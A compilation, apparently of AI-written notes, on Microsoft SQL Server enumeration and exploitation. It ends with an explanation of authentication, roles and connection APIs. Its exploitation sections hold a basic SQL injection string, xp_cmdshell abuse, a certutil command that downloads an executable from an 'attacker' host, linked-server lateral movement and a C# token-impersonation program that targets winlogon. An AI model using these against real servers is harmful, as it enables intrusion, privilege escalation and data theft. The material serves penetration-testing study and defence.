### Primer on MSSQL and Its Enumeration

Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. It is used to store and retrieve data requested by other software applications, whether on the same computer or across a network. SQL Server supports a variety of administrative functions, including user management, permissions management, and more. In security assessments, enumerating MSSQL can help identify misconfigurations, weaknesses, and potential attack vectors.

#### **1. Basics of MSSQL**
- **Components**:
  - **Database Engine**: Core service for storing, processing, and securing data.
  - **SQL Server Agent**: Manages and executes scheduled tasks.
  - **SQL Server Management Studio (SSMS)**: Integrated environment for managing SQL infrastructure.
  - **Transact-SQL (T-SQL)**: Microsoft's extension to SQL used for database management.

- **Common Ports**:
  - **TCP 1433**: Default port for SQL Server communication.
  - **UDP 1434**: SQL Server Browser Service, used to locate SQL Server instances.

#### **2. Connecting to MSSQL**
To interact with an MSSQL server, you can use a variety of tools:

- **SQLCMD** (Command Line):
  ```bash
  sqlcmd -S <server_name> -U <username> -P <password>
  ```
- **PowerShell**:
  ```powershell
  Invoke-Sqlcmd -ServerInstance "<server_name>" -Username "<username>" -Password "<password>" -Query "SELECT @@version"
  ```

- **MSSQL Client** (Linux tool):
  ```bash
  mssqlclient.py domain/user@server -windows-auth
  ```

- **SQL Server Management Studio (SSMS)**:
  GUI tool for connecting, managing, and administering SQL Server.

#### **3. MSSQL Enumeration Techniques**

##### **A. Version Information**
- **SQLCMD**:
  ```sql
  SELECT @@version;
  ```
  This command retrieves the SQL Server version information.

##### **B. Enumerating Databases**
- **List Databases**:
  ```sql
  SELECT name FROM master.sys.databases;
  ```

- **Detailed Info**:
  ```sql
  EXEC sp_helpdb;
  ```

##### **C. Enumerating Users and Privileges**
- **List Logins**:
  ```sql
  SELECT name FROM sys.server_principals WHERE type = 'S';
  ```

- **List Database Users**:
  ```sql
  SELECT UserName = name FROM master.sys.syslogins;
  ```

- **List User Roles**:
  ```sql
  EXEC sp_helprolemember;
  ```

- **List Privileges**:
  ```sql
  SELECT dp.name AS PrincipalName, dp.type_desc AS PrincipalType, 
         o.name AS ObjectName, p.permission_name, p.state_desc AS PermissionState
  FROM sys.database_permissions p
  JOIN sys.objects o ON p.major_id = o.object_id
  JOIN sys.database_principals dp ON p.grantee_principal_id = dp.principal_id;
  ```

##### **D. Enumerating Linked Servers**
- **List Linked Servers**:
  ```sql
  EXEC sp_linkedservers;
  ```

- **Test Linked Server Connection**:
  ```sql
  EXEC sp_testlinkedserver 'linked_server_name';
  ```

Linked servers can be exploited to move laterally across databases or systems if misconfigured.

##### **E. Enumerating Running Processes**
- **List Running Processes**:
  ```sql
  EXEC sp_who2;
  ```

This will show you information about current processes, including running queries and user connections.

##### **F. Checking for XP_CMDSHELL**
- **Check if Enabled**:
  ```sql
  EXEC sp_configure 'xp_cmdshell';
  ```

- **Enable XP_CMDSHELL**:
  ```sql
  EXEC sp_configure 'show advanced options', 1;
  RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1;
  RECONFIGURE;
  ```

XP_CMDSHELL allows execution of shell commands via SQL Server and can be a powerful vector for privilege escalation.

##### **G. Searching for Sensitive Data**
- **Search for Columns with Potentially Sensitive Data**:
  ```sql
  SELECT table_name, column_name
  FROM information_schema.columns
  WHERE column_name LIKE '%password%'
     OR column_name LIKE '%credit%'
     OR column_name LIKE '%ssn%';
  ```

This query will help you identify tables and columns that may contain sensitive information.

#### **4. Exploitation Techniques**

##### **A. SQL Injection**
- **Basic Example**:
```sql
' OR 1=1--
```
##### **B. Privilege Escalation**
- **Impersonate SA Account**:
  ```sql
  EXECUTE AS LOGIN = 'sa';
  ```
  If the current user has impersonation privileges, this command can elevate privileges to the `sa` (system administrator) level.

##### **C. Using XP_CMDSHELL**
- **Execute a Command**:
  ```sql
  EXEC xp_cmdshell 'whoami';
  ```

- **Upload a File**:
  ```sql
  EXEC xp_cmdshell 'certutil.exe -urlcache -split -f http://attacker/file.exe file.exe';
  ```

##### **D. Data Exfiltration**
- **BULK INSERT** (reads from a file on the server):
  ```sql
  BULK INSERT my_table FROM 'C:\path\to\data.txt' WITH (FIELDTERMINATOR = ',', ROWTERMINATOR = '\n');
  ```

- **OPENROWSET** (can be used for remote data extraction):
  ```sql
  SELECT * FROM OPENROWSET('SQLNCLI', 'Server=remote_server;Trusted_Connection=yes;', 'SELECT * FROM remote_db.remote_table');
  ```

##### **E. Moving Laterally**
- **Using Linked Servers**:
  ```sql
  EXECUTE ('<command>') AT [linked_server];
  ```

This allows the attacker to execute commands on other SQL servers in the environment.

### **5. Defense Mechanisms**
- **Restrict XP_CMDSHELL**: Disable or strictly monitor the usage of `xp_cmdshell`.
- **Apply Principle of Least Privilege**: Ensure users have the minimum permissions necessary for their roles.
- **Monitor SQL Server Logs**: Regularly audit and monitor SQL logs for suspicious activity.
- **Patch and Update**: Regularly apply updates to SQL Server to protect against vulnerabilities.
- **Use Encrypted Connections**: Ensure that connections to SQL Server are encrypted to protect sensitive data in transit.

### **Conclusion**
MSSQL enumeration is a critical phase in the security assessment of a SQL Server environment. It helps in understanding the server's configuration, identifying potential vulnerabilities, and determining attack vectors. By leveraging the commands and techniques outlined above, attackers can effectively enumerate and exploit MSSQL servers, highlighting the importance of securing these systems against common misconfigurations and attacks.

### Powershell connection methods

Yes, you can connect to an MSSQL (Microsoft SQL Server) database using PowerShell. The most common method is using the `Invoke-Sqlcmd` cmdlet, which is available through the **SQL Server** module. Alternatively, you can use .NET classes to connect to SQL Server. Below are examples of both methods.

### Method 1: Using `Invoke-Sqlcmd` Cmdlet

#### Prerequisites:
- The `SqlServer` module must be installed. If it's not already installed, you can install it via PowerShell:

   ```powershell
   Install-Module -Name SqlServer -AllowClobber
   ```

#### Example Script:
```powershell
# Import the SqlServer module
Import-Module SqlServer

# Define connection details
$server = "your_sql_server"
$database = "your_database"
$query = "SELECT TOP 10 * FROM your_table"

# Execute the query
$result = Invoke-Sqlcmd -ServerInstance $server -Database $database -Query $query

# Display the results
$result
```

### Method 2: Using .NET Classes

#### Example Script:
```powershell
# Define connection details
$server = "your_sql_server"
$database = "your_database"
$user = "your_username"  # Use Integrated Security by omitting $user and $password
$password = "your_password"

# Build the connection string
$connectionString = "Server=$server;Database=$database;User Id=$user;Password=$password;"

# Create a new SQL connection object
$connection = New-Object System.Data.SqlClient.SqlConnection
$connection.ConnectionString = $connectionString

# Open the connection
$connection.Open()

# Define the SQL query
$query = "SELECT TOP 10 * FROM your_table"

# Create a SQL command object
$command = $connection.CreateCommand()
$command.CommandText = $query

# Execute the query and store results
$reader = $command.ExecuteReader()

# Read and display the results
while ($reader.Read()) {
    for ($i = 0; $i -lt $reader.FieldCount; $i++) {
        Write-Host "$($reader.GetName($i)): $($reader.GetValue($i))"
    }
    Write-Host "-------------------"
}

# Close the connection
$reader.Close()
$connection.Close()
```

Yes, the script using .NET classes can authenticate via Kerberos. To do this, you should configure the connection string to use **Integrated Security**, which means it will use the current user's Windows credentials for authentication. When `Integrated Security` is set to `SSPI`, Kerberos is used as the authentication protocol if it's properly configured in the environment.

Here’s how you can modify the script to authenticate via Kerberos:

### Example Script for Kerberos Authentication:
```powershell
# Define connection details
$server = "your_sql_server"
$database = "your_database"

# Build the connection string for Kerberos authentication
$connectionString = "Server=$server;Database=$database;Integrated Security=SSPI;"

# Create a new SQL connection object
$connection = New-Object System.Data.SqlClient.SqlConnection
$connection.ConnectionString = $connectionString

# Open the connection
$connection.Open()

# Define the SQL query
$query = "SELECT TOP 10 * FROM your_table"

# Create a SQL command object
$command = $connection.CreateCommand()
$command.CommandText = $query

# Execute the query and store results
$reader = $command.ExecuteReader()

# Read and display the results
while ($reader.Read()) {
    for ($i = 0; $i -lt $reader.FieldCount; $i++) {
        Write-Host "$($reader.GetName($i)): $($reader.GetValue($i))"
    }
    Write-Host "-------------------"
}

# Close the connection
$reader.Close()
$connection.Close()
```

### Key Points:
1. **Integrated Security=SSPI**: This setting in the connection string ensures that the connection uses the current user's Windows credentials, which by default leverages Kerberos when both the client and server are properly configured for it.

2. **No Need for Username and Password**: When using Kerberos via `Integrated Security`, there's no need to specify a username and password in the script. The script will automatically use the credentials of the currently logged-in user.

### Prerequisites for Kerberos Authentication:
- **SPNs (Service Principal Names)**: The SQL Server service must have a properly registered SPN for Kerberos to function. For example:
  ```shell
  setspn -S MSSQLSvc/your_sql_server:1433 domain\sql_service_account
  ```
- **DNS and Network Configuration**: Ensure that the DNS is correctly configured and that the client can resolve the SQL Server's hostname.

- **Trust Relationship**: There should be a trust relationship between the client and the SQL Server domain.

When these conditions are met, the script will authenticate via Kerberos, and you can take advantage of Kerberos's strong security features.

### Linked Servers in MSSQL: Explanation and Exploitation

#### **What are Linked Servers?**

Linked Servers in MSSQL are a feature that allows a SQL Server instance to execute commands against OLE DB data sources on remote servers. These remote servers could be another SQL Server instance or different types of data sources (like Oracle, MySQL, or even a simple text file). Linked Servers make it easier to execute distributed queries, commands, or stored procedures across multiple servers.

**Use Cases:**
- Querying data from a remote server.
- Performing distributed transactions across multiple SQL Server instances.
- Accessing heterogeneous data sources in one place.

**Basic Linked Server Setup Example:**
```sql
EXEC sp_addlinkedserver 
   @server='RemoteServerName', 
   @srvproduct='', 
   @provider='SQLNCLI', 
   @datasrc='RemoteServerIP';
```

**Linked Server Security Configuration:**
- **Linked Server Authentication**: When setting up a linked server, you can specify how the SQL Server authenticates with the remote server. This could be using the same credentials as the local server, or using specific credentials.
  
- **Mapping Local Logins to Remote Logins**: You can map local SQL Server logins to different credentials on the remote server.

#### **Common Linked Server Exploitation Techniques**

##### **1. Querying a Remote Server via Linked Server**

A simple query to retrieve data from a remote server:
```sql
SELECT * FROM [RemoteServerName].[DatabaseName].[SchemaName].[TableName];
```

##### **2. Executing a Command on a Remote Server**

You can execute a command on a remote server using `EXEC`:
```sql
EXEC ('SELECT @@version') AT [RemoteServerName];
```

##### **3. Elevating Privileges Using Linked Servers**

**Impersonation via Linked Servers**:
- If a linked server is configured with credentials that have higher privileges than your current account, you may be able to leverage that to escalate your privileges on the remote server.

**Example**:
If the linked server is configured to use a highly privileged account (like `sa`) for connections, executing a query on the linked server will use the `sa` account's privileges.

```sql
EXEC ('SELECT * FROM sensitive_table') AT [LinkedServerWithHighPrivileges];
```

##### **4. Stealing Credentials**

If the linked server is configured to use SQL authentication, those credentials might be stored in plaintext in the server's configuration, which can be retrieved using certain queries.

**Extracting Linked Server Credentials**:
- Enumerate the linked servers:
  ```sql
  EXEC sp_linkedservers;
  ```
- Extract credentials (if any are stored):
  ```sql
  SELECT * FROM sys.servers;
  SELECT * FROM sys.linked_logins;
  ```

##### **5. Lateral Movement via Linked Servers**

If multiple servers are linked, an attacker could move laterally by executing commands on different linked servers. This might allow you to access servers you wouldn't normally have access to directly.

**Example of Lateral Movement**:
```sql
EXEC ('EXEC sp_linkedservers') AT [AnotherLinkedServer];
```

##### **6. Stealing Kerberos Tickets**

While Linked Servers themselves do not directly allow stealing Kerberos tickets, misconfigurations in their setup could lead to scenarios where you can run commands or queries that extract credentials, potentially leading to ticket theft.

**Delegation Issues**: 
- If the SQL Server is misconfigured to allow unconstrained delegation and is also configured as a linked server, it might be possible to capture Kerberos tickets.

**Pass-the-Ticket**: 
- If you can access a system with linked server access and you have a valid Kerberos ticket (TGT or service ticket), you could pass that ticket to access the linked server without needing a password.

**Example Pass-the-Ticket Attack with Linked Servers**:
1. Capture the Kerberos ticket from memory using tools like `Mimikatz` or `Rubeus`.
2. Import the ticket on your local machine using `klist` or similar tools.
3. Use the ticket to authenticate against the linked server.

##### **7. Abusing xp_cmdshell via Linked Servers**

If `xp_cmdshell` is enabled on the remote server (or can be enabled by the attacker), it's possible to execute shell commands on the remote server.

**Example of Executing Shell Commands**:
```sql
EXEC ('EXEC xp_cmdshell ''whoami''') AT [RemoteServerName];
```

This could allow for full control over the remote server, potentially leading to further privilege escalation or lateral movement.

#### **Defending Against Linked Server Attacks**

1. **Least Privilege Principle**: Ensure that linked servers only have the minimum necessary privileges. Avoid using highly privileged accounts like `sa` for linked server connections.
  
2. **Regular Auditing**: Regularly audit linked server configurations and permissions to ensure no unnecessary access is granted.

3. **Disable `xp_cmdshell`**: If `xp_cmdshell` is not needed, it should be disabled to prevent remote command execution.

4. **Use Encrypted Connections**: Ensure that communication between linked servers is encrypted to prevent data interception.

5. **Monitor for Unusual Activity**: Implement logging and monitoring for unusual queries or commands executed via linked servers.

6. **Restrict Delegation**: Carefully manage and restrict delegation settings, particularly unconstrained delegation, to prevent Kerberos ticket abuse.

### **Conclusion**

Linked Servers are a powerful feature in MSSQL that can be exploited if misconfigured. Attackers can use them to escalate privileges, steal credentials, move laterally within a network, and execute arbitrary commands on remote servers. Proper configuration, auditing, and monitoring are crucial to prevent exploitation.

To demonstrate privilege escalation using token impersonation in conjunction with MSSQL in C# or C++, here's an overview:

1. **MSSQL Access**: The code connects to an MSSQL server using a lower-privileged user account.
2. **Token Impersonation**: The code then leverages a technique to impersonate a token with higher privileges.

The focus will be on using the C# example with MSSQL, then showing how token impersonation might occur.

### C# Example

#### Prerequisites

- Ensure you have references to `System.Data.SqlClient` or `Microsoft.Data.SqlClient` for MSSQL connections.
- The code uses P/Invoke to call native Windows API functions necessary for token manipulation.

#### **C# Code Example: Connecting to MSSQL and Token Impersonation**

```csharp
using System;
using System.Data.SqlClient;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Diagnostics;

namespace TokenImpersonationExample
{
    class Program
    {
        // P/Invoke declarations
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        // Access rights
        const uint TOKEN_QUERY = 0x0008;
        const uint TOKEN_DUPLICATE = 0x0002;
        const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        const uint TOKEN_IMPERSONATE = 0x0004;
        const int SecurityImpersonation = 2;

        static void Main(string[] args)
        {
            // Connection string to MSSQL with low-privileged account
            string connectionString = "Server=myServerAddress;Database=myDataBase;User Id=myUsername;Password=myPassword;";
            using (SqlConnection connection = new SqlConnection(connectionString))
            {
                try
                {
                    connection.Open();
                    Console.WriteLine("Connected to MSSQL Server.");

                    // Fetch processes (targeting an elevated process like 'winlogon.exe')
                    Process[] processes = Process.GetProcessesByName("winlogon");
                    if (processes.Length > 0)
                    {
                        IntPtr tokenHandle = IntPtr.Zero;
                        IntPtr duplicateTokenHandle = IntPtr.Zero;

                        // Open process token
                        if (OpenProcessToken(processes[0].Handle, TOKEN_DUPLICATE | TOKEN_IMPERSONATE, out tokenHandle))
                        {
                            Console.WriteLine("Process token opened.");

                            // Duplicate the token
                            if (DuplicateToken(tokenHandle, SecurityImpersonation, out duplicateTokenHandle))
                            {
                                Console.WriteLine("Token duplicated.");

                                // Impersonate the token
                                if (ImpersonateLoggedOnUser(duplicateTokenHandle))
                                {
                                    Console.WriteLine("Token impersonation successful.");
                                    // Now running with elevated privileges
                                    // Execute privileged actions here...
                                }
                                else
                                {
                                    Console.WriteLine("Token impersonation failed.");
                                }

                                CloseHandle(duplicateTokenHandle);
                            }
                            else
                            {
                                Console.WriteLine("Token duplication failed.");
                            }

                            CloseHandle(tokenHandle);
                        }
                        else
                        {
                            Console.WriteLine("OpenProcessToken failed.");
                        }
                    }
                    else
                    {
                        Console.WriteLine("No target processes found.");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error: " + ex.Message);
                }
            }
        }
    }
}
```

### Explanation:

1. **SQL Connection**:
   - The program first establishes a connection to an MSSQL server using a lower-privileged account.

2. **Token Impersonation**:
   - The code attempts to impersonate a token associated with a privileged process (`winlogon.exe` in this case). 
   - It opens the process token, duplicates it, and then impersonates the logged-on user.
   - If successful, the code executes with the privileges of the impersonated token.

### Notes:

- **Privileges**: For token manipulation, the user running this code must have specific rights. Typically, this requires `SeDebugPrivilege`, which is usually available to administrators.
- **Target Process**: The code targets the `winlogon.exe` process, which runs with `SYSTEM` privileges. This could be replaced with other processes depending on the scenario.
- **Security**: This code represents a typical privilege escalation technique often used by attackers. This code should only be used in environments where you have permission to perform such actions.

### Considerations:

- **Detecting and Mitigating**:
  - Proper monitoring and auditing of process and token operations.
  - Ensuring that least privilege principles are followed.

### C++ Version (Using Win32 APIs)

If you prefer a C++ version, it would involve similar steps using the Win32 API. The implementation would use functions like `OpenProcess`, `OpenProcessToken`, `DuplicateTokenEx`, and `ImpersonateLoggedOnUser`.

### Summary

This code demonstrates how to perform token impersonation after connecting to MSSQL, a technique that can be leveraged for privilege escalation in certain scenarios. Use these techniques responsibly within your testing or educational environments.


If the `sa` (System Administrator) account in SQL Server is compromised, there are several potential sources of information leakage. The `sa` account has the highest level of privileges, allowing full control over the SQL Server instance. Here’s how an attacker could exploit the `sa` account to leak sensitive information:

### 1. **Database Content**
   - **Access to All Databases**: The `sa` account can access all databases on the SQL Server instance, which may contain sensitive information like user data, financial records, or intellectual property.
   - **Copying Data**: The attacker can create backups or export database content, which can then be exfiltrated.

### 2. **SQL Server Configuration**
   - **Reading System Tables and Views**: System tables and views can provide detailed information about the server configuration, user accounts, and more.
   - **Access to SQL Server Logs**: Logs may contain sensitive information, such as executed queries, login attempts, and other activities.

### 3. **Linked Servers**
   - **Linked Server Exploitation**: If there are linked servers configured, the `sa` account can access them and potentially gain control over other SQL Server instances or extract data from them.
   - **Credential Theft**: Credentials stored in linked servers can be extracted, providing access to other resources.

### 4. **SQL Server Agent Jobs**
   - **Job Details**: SQL Server Agent Jobs can be read, modified, or created by the `sa` account. Job scripts may contain credentials or other sensitive information.
   - **Malicious Jobs**: An attacker could create a job to run malicious scripts or exfiltrate data periodically.

### 5. **Operating System Access**
   - **xp_cmdshell**: If enabled, `xp_cmdshell` allows the execution of OS-level commands directly from SQL Server. An attacker can use this to browse the file system, read/write files, and execute other commands.
   - **File System Access**: The `sa` account can access the underlying file system using T-SQL commands like `OPENROWSET` or `BULK INSERT`.
   - **Registry Access**: The `sa` account can read or write to the Windows registry using `xp_regread`, `xp_regwrite`, and other extended stored procedures.

### 6. **Credential Information**
   - **Stored Credentials**: SQL Server may store credentials in plaintext or weakly encrypted formats within the database or in configuration files. The `sa` account can access these.
   - **Credential Harvesting**: The `sa` account can capture login events, potentially revealing usernames and passwords if not properly secured.

### 7. **Sensitive Information in Stored Procedures and Functions**
   - **Source Code Access**: The `sa` account can view and modify the code of stored procedures, functions, and triggers, which may contain business logic or sensitive data handling.
   - **Hardcoded Credentials**: Stored procedures and functions may contain hardcoded credentials or sensitive information.

### 8. **SQL Server Error Messages**
   - **Verbose Error Messages**: By triggering errors, the attacker can cause SQL Server to reveal information about the database structure, contents, and even potentially sensitive data in error messages.

### 9. **Network Traffic**
   - **Network Sniffing**: If SQL Server is configured to send sensitive data over the network without encryption, an attacker with `sa` access could configure network-related settings to enable packet sniffing.
   - **Data Exfiltration**: The attacker can use SQL Server features to send data out of the network (e.g., via HTTP endpoints or external scripts).

### 10. **Data Replication**
   - **Replication Configurations**: The `sa` account can access and potentially manipulate replication settings, allowing data to be replicated to a server under the attacker's control.

### 11. **SQL Server Integration Services (SSIS)**
   - **SSIS Packages**: SSIS packages may contain sensitive data or credentials. The `sa` account can access and modify these packages.

### 12. **Encryption Keys**
   - **Access to Encryption Keys**: If the SQL Server uses encryption for columns or backups, the `sa` account can potentially access or export the encryption keys, allowing decryption of sensitive data.

### 13. **Service Accounts**
   - **Access to Service Accounts**: The `sa` account can access information about service accounts used by SQL Server, which may be used in other parts of the network.

### Mitigation Measures
   - **Strong Authentication**: Ensure the `sa` account uses strong passwords or is disabled if not needed.
   - **Limit Permissions**: Avoid using the `sa` account for regular operations; use accounts with the least privilege necessary.
   - **Encrypt Sensitive Data**: Use encryption to protect sensitive data both at rest and in transit.
   - **Monitoring and Auditing**: Regularly monitor and audit SQL Server activity, focusing on `sa` account usage.
   - **Disable xp_cmdshell**: Disable `xp_cmdshell` unless explicitly required, and control access tightly.

By understanding these potential leakage points, you can better protect your SQL Server environment from exploitation if the `sa` account is compromised.

Microsoft SQL Server (MSSQL) can be integrated with Active Directory (AD) for authentication, allowing Windows users and groups to access SQL Server databases without needing separate SQL Server logins. This integration is primarily done through **Windows Authentication**, which relies on AD credentials. Here’s how MSSQL authentication works with Active Directory:

### 1. **Authentication Modes in SQL Server**
   SQL Server supports two main authentication modes:
   - **Windows Authentication Mode**: Only AD credentials are used to log in to SQL Server.
   - **Mixed Mode Authentication**: Both AD credentials (Windows Authentication) and SQL Server-specific logins (SQL Authentication) are supported.

### 2. **Windows Authentication Process**
   When Windows Authentication is used:
   - The client (e.g., SQL Server Management Studio, application, or service) attempts to connect to the SQL Server using the current Windows user's credentials.
   - The user's credentials are validated by the Active Directory Domain Controller (DC).
   - If the authentication is successful, the Kerberos protocol or NTLM (if Kerberos is not available) is used to establish a secure session between the client and SQL Server.
   - SQL Server then checks the user’s group memberships and roles to determine the level of access.

### 3. **Kerberos Authentication**
   - **Kerberos Protocol**: If the SQL Server and client are in the same AD domain, or have a trust relationship, Kerberos is typically used. This requires a Service Principal Name (SPN) to be registered for the SQL Server service.
   - **Service Principal Name (SPN)**: An SPN is a unique identifier for a service running on a specific server. For SQL Server, it typically looks like `MSSQLSvc/hostname:port` or `MSSQLSvc/fqdn:port`.
   - **Ticket Granting**: When a client connects to SQL Server, it requests a Ticket Granting Service (TGS) ticket from the DC. This ticket is then used to authenticate to the SQL Server, which validates the ticket against its own service account.

### 4. **NTLM Authentication**
   - If Kerberos is not available (e.g., due to misconfiguration, lack of SPN, or cross-domain access without proper trust), SQL Server falls back to NTLM.
   - NTLM is less secure than Kerberos and does not support mutual authentication.

### 5. **Group-Based Access Control**
   - SQL Server can grant permissions based on Windows group memberships. Instead of creating individual logins for each user, AD groups can be granted access to databases and SQL Server roles.
   - For example, a group called `Domain\SQLAdmins` can be given administrative rights on SQL Server. Any user in this AD group will inherit those permissions when they log in.

### 6. **Kerberos Constrained Delegation**
   - This feature allows SQL Server to impersonate the client and access resources on their behalf, such as when querying linked servers or using SSRS (SQL Server Reporting Services).
   - Constrained delegation requires careful configuration in AD to limit which services can be accessed by SQL Server on behalf of the user.

### 7. **SQL Server Service Account**
   - The SQL Server service typically runs under a Windows service account. This account must have the necessary privileges to register SPNs and interact with AD for authentication purposes.

### 8. **Credential Caching**
   - Windows caches credentials locally, allowing SQL Server to authenticate users even if the domain controller is temporarily unavailable. This is a security consideration, as cached credentials can be targeted by attackers.

### 9. **AD-Integrated Security Features**
   - **Always Encrypted**: SQL Server can use AD for key management in Always Encrypted configurations, storing the encryption keys in Active Directory.
   - **Transparent Data Encryption (TDE)**: Integration with AD can allow centralized management of encryption keys via Active Directory Certificate Services (ADCS).

### 10. **Advantages of Using AD with SQL Server**
   - **Centralized Management**: User accounts, groups, and permissions can be managed centrally in AD, reducing administrative overhead.
   - **Single Sign-On (SSO)**: Users can authenticate to SQL Server using the same credentials they use for other AD-integrated services.
   - **Enhanced Security**: By leveraging Kerberos, SQL Server benefits from strong authentication protocols and the ability to enforce policies like multi-factor authentication (MFA).

### 11. **Security Considerations**
   - **SPN Configuration**: Incorrect SPN configuration can lead to authentication issues or security vulnerabilities. It’s important to ensure that SPNs are correctly registered for the SQL Server service account.
   - **Service Account Security**: The service account under which SQL Server runs should be secured and have the least privilege necessary. Misconfigured service accounts can lead to privilege escalation or service disruptions.
   - **NTLM Risks**: Falling back to NTLM is less secure and may expose the environment to pass-the-hash attacks. Kerberos should be used wherever possible.

### 12. **Managing SQL Server Logins and AD Integration**
   - **Creating Logins**: You can create a SQL Server login for a specific AD user or group:
     ```sql
     CREATE LOGIN [Domain\User] FROM WINDOWS;
     ```
   - **Granting Access**: Granting access to a database:
     ```sql
     USE [DatabaseName];
     CREATE USER [Domain\User] FOR LOGIN [Domain\User];
     ALTER ROLE [db_owner] ADD MEMBER [Domain\User];
     ```

Understanding how MSSQL integrates with Active Directory is crucial for managing secure access to SQL Server instances and ensuring proper authentication mechanisms are in place.

In Microsoft SQL Server (MSSQL), roles are used to simplify the management of permissions. Roles are a collection of permissions that can be applied to users, groups, or other roles. SQL Server includes several built-in roles, and you can also create custom roles to suit your specific security needs. These roles are broadly categorized into **server-level roles** and **database-level roles**.

### 1. **Server-Level Roles**
   Server-level roles are used to manage permissions on the SQL Server instance itself and apply to the entire server. They control access to server-wide administrative tasks.

   **Fixed Server Roles:**
   - **sysadmin**: Members have unrestricted access to all server functions and resources. They can perform any activity on the server.
   - **serveradmin**: Members can configure server-wide settings, including shutting down the server.
   - **securityadmin**: Members manage server logins, including creating, deleting, and modifying logins and permissions. They can also grant, deny, and revoke server-level and database-level permissions.
   - **processadmin**: Members can manage SQL Server processes (kill sessions, for example).
   - **setupadmin**: Members can manage linked servers, startup procedures, and configure replication.
   - **bulkadmin**: Members can run the BULK INSERT statement.
   - **diskadmin**: Members manage disk files, including creating and managing data files.
   - **dbcreator**: Members can create, alter, drop, and restore databases.
   - **public**: Every login belongs to the public server role automatically, but it has very limited permissions. It is the default role for any user.

   **Custom Server Roles:**
   - SQL Server allows the creation of custom server roles. Custom server roles can be assigned specific server-level permissions, providing a more granular control over server administration.

   **Example:**
   ```sql
   CREATE SERVER ROLE [my_custom_server_role];
   GRANT ALTER ANY LOGIN TO [my_custom_server_role];
   ```

### 2. **Database-Level Roles**
   Database-level roles are used to manage permissions within a specific database. Each database in SQL Server has its own set of roles.

   **Fixed Database Roles:**
   - **db_owner**: Members have full access to the database, similar to sysadmin at the database level. They can perform any database task.
   - **db_securityadmin**: Members manage database-level security, including roles and permissions.
   - **db_accessadmin**: Members manage database access for users.
   - **db_backupoperator**: Members can back up the database.
   - **db_ddladmin**: Members can run Data Definition Language (DDL) commands, such as CREATE, ALTER, DROP, and so on.
   - **db_datawriter**: Members can add, delete, or modify data in all user tables.
   - **db_datareader**: Members can read all data from all user tables and views.
   - **db_denydatawriter**: Members cannot add, modify, or delete data in any user tables.
   - **db_denydatareader**: Members cannot read data from any user tables or views.

   **Application Roles:**
   - Application roles are database-level roles that are used to enforce permissions for applications. They can be activated by applications to ensure that the application accesses the database with a specific set of permissions, regardless of the user’s permissions.

   **Custom Database Roles:**
   - Just like server roles, you can create custom database roles. Custom database roles allow you to group together a specific set of permissions that apply only within a particular database.

   **Example:**
   ```sql
   USE [YourDatabaseName];
   CREATE ROLE [my_custom_db_role];
   GRANT SELECT, INSERT, UPDATE ON [YourTableName] TO [my_custom_db_role];
   ```

### 3. **Public Role**
   - The **public** role is a special role that exists at both the server and database levels. Every user is automatically a member of the public role. The public role is used to assign default permissions that all users should have.

### 4. **Role Membership**
   - Roles can be nested, meaning that a role can be a member of another role. This allows for complex permission structures where roles inherit permissions from other roles.
   - Users, groups, and other roles can be members of a role. When a user is added to a role, they inherit all the permissions assigned to that role.

### 5. **Managing Roles**
   - **Adding a User to a Role**: You can add a user to a role using the following SQL statement:
     ```sql
     ALTER ROLE [role_name] ADD MEMBER [user_name];
     ```
   - **Removing a User from a Role**: You can remove a user from a role with:
     ```sql
     ALTER ROLE [role_name] DROP MEMBER [user_name];
     ```
   - **Dropping a Role**: A role can be removed (as long as it has no members) using:
     ```sql
     DROP ROLE [role_name];
     ```

### 6. **Best Practices**
   - **Use Roles to Manage Permissions**: Instead of assigning permissions directly to users, it’s better to assign them to roles. This simplifies management and makes it easier to audit permissions.
   - **Review and Monitor Role Memberships**: Regularly review role memberships to ensure that users have only the permissions they need.
   - **Use Custom Roles for Granular Control**: When the built-in roles are too broad or too narrow for your needs, create custom roles to provide the exact permissions required.

Understanding these roles and how to use them effectively is critical for managing security in SQL Server, ensuring that users have appropriate levels of access while maintaining the principle of least privilege.

The Win32 APIs commonly used to connect to Microsoft SQL Server (MSSQL) primarily belong to the ODBC (Open Database Connectivity) and OLE DB (Object Linking and Embedding Database) libraries. Additionally, there are more modern and managed options like ADO.NET in the .NET Framework.

### 1. **ODBC APIs**
ODBC is a standard API for accessing database management systems (DBMS). ODBC API functions are primarily used in C and C++ applications.

| API Function              | Description                                                   |
|---------------------------|---------------------------------------------------------------|
| `SQLAllocHandle`          | Allocates an environment, connection, statement, or descriptor handle. |
| `SQLConnect`              | Establishes a connection to a driver and a data source.        |
| `SQLDriverConnect`        | Connects to a data source using a connection string.          |
| `SQLExecDirect`           | Executes an SQL statement directly.                           |
| `SQLPrepare`              | Prepares an SQL statement for execution.                      |
| `SQLExecute`              | Executes a prepared SQL statement.                            |
| `SQLFetch`                | Fetches the next row from the result set.                     |
| `SQLGetData`              | Retrieves data for a single column in the result set.         |
| `SQLDisconnect`           | Disconnects from the data source.                             |
| `SQLFreeHandle`           | Frees a handle allocated by `SQLAllocHandle`.                 |

### 2. **OLE DB APIs**
OLE DB is a set of COM-based APIs for accessing different types of data stores. These are generally used in C++ and older COM-based applications.

| API Function                 | Description                                                   |
|------------------------------|---------------------------------------------------------------|
| `IDataInitialize::GetDataSource` | Initializes a data source object for accessing a database. |
| `IDBCreateSession::CreateSession` | Creates a session object to start transactions or command execution. |
| `IDBCreateCommand::CreateCommand` | Creates a command object for executing SQL queries.      |
| `ICommandText::SetCommandText` | Sets the SQL command text for a command object.            |
| `ICommand::Execute`          | Executes the command on the data source.                     |
| `IRowset::GetNextRows`       | Fetches the next row from the result set.                    |
